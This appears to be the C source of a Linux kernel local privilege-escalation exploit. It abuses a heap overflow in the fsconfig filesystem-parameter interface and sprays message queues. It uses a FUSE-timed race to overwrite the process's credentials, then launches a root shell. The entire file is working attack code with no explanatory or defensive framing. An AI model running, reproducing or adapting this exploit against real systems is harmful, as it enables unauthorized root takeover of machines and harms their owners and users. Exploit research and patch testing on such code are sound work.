#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdint.h>
#include "fakefuse.h"
#include "blast.h"

int fd = -1;
void *cred = NULL;

// overflow to change msg_msg.next to cred->euid - 8
void *arb_write(void *args)
{
    uint64_t goal = (uint64_t)cred + 20 - 8;
    printf("[+] GOAL: 0x%lx\n", goal);
    char pat[0x1000] = {0};
    memset(pat, 0x41, 29);
    char evil[0x20];
    memcpy(evil, (void *)&goal, 8);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
    puts("[*] Done heap overflow");
    write(fuse_pipes[1], "A", 1);
}

// msg_msg arb write trick by hanging before msgseg on usercopy
// use FUSE to time the race
void do_win() 
{
    int size = 0x1000;
    char buffer[0x2000] = {0};
    char pat[0x1000] = {0};
    msg* message = (msg*)buffer;
    memset(buffer, 0x44, sizeof(buffer));

    size = 0x1010;

    int target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(target, message, size - 0x30, 0);

    puts("[*] Opening ext4 filesystem");
    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
        perror("fsopen");
        exit(-1);
    }
    puts("[*] Overflowing...");
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
    {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    }
    
    puts("[*] Prepaing fault handlers via FUSE");
    int evil_fd = open("evil/evil", O_RDWR);
    if (evil_fd < 0)
    {
        perror("evil fd failed");
        exit(-1);
    }
    if ((mmap((void *)0x1338000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, evil_fd, 0)) != (void *)0x1338000)
    {
        perror("mmap fail fuse 1");
        exit(-1);
    }

    uint64_t race_page = 0x1338020+12;
    msg *rooter = (msg *)(race_page-0x8);
    // rooter->mtype = 1;

    pthread_t thread;
    int race = pthread_create(&thread, NULL, arb_write, NULL);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    send_msg(target, rooter, size - 0x30, 0);
    pthread_join(thread, NULL);
    munmap((void *)0x1337000, 0x1000);
    munmap((void *)0x1338000, 0x1000);
    close(evil_fd);
    close(fd);
}

void spray_4k(int spray)
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1000;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < spray; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, size - 0x30, 0);
    }
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    syscall(__NR_unshare, CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

static const struct fuse_operations evil_ops = {
    .getattr        = evil_getattr,
    .readdir        = evil_readdir,
    .read           = evil_read,
};

char *fargs_evil[] = {"exploit", "evil", NULL };

int root_exp[2];

void prepare_root() {
    char tmp_buf[1];
    uid_t euid;

    prctl(PR_SET_NAME, special_comm, 0, 0, 0);
    write(root_exp[1], "A", sizeof(tmp_buf));

    while (1)
    {
        sleep(5);
        euid = geteuid();
        printf("[i] euid: %d\n", euid);
        if (!euid) break;
    }

    puts("[+] Popping shell");
    execve(SHELL, root_argv, NULL);

    exit(0);
}

int main(int argc, char **argv, char **envp) 
{
    if (pipe(root_exp) == -1) {
        perror("pipe failed");
        return 1;
    }
    if (fork()) prepare_root();

    char tmp_buf[1];
    read(root_exp[0], tmp_buf, sizeof(tmp_buf));
    cred = blask_for_cred();
    if (cred == NULL)
    {
        perror("[!] Error on blasting");
        exit(-1);
    }
    printf("[+] Found cred: 0x%lx\n", (unsigned long)cred);

    fargs_evil[0] = argv[0];
    unshare_setup(getuid(), getgid());
    mkdir(MNT_PATH, 0777);
    pipe(fuse_pipes);

    if (!fork())
    {
        fuse_main(sizeof(fargs_evil)/sizeof(char *) -1 , fargs_evil, &evil_ops, NULL);
    }
    
    spray_4k(30);
    while (1) 
    {
        do_win();
    }
    return 0;
}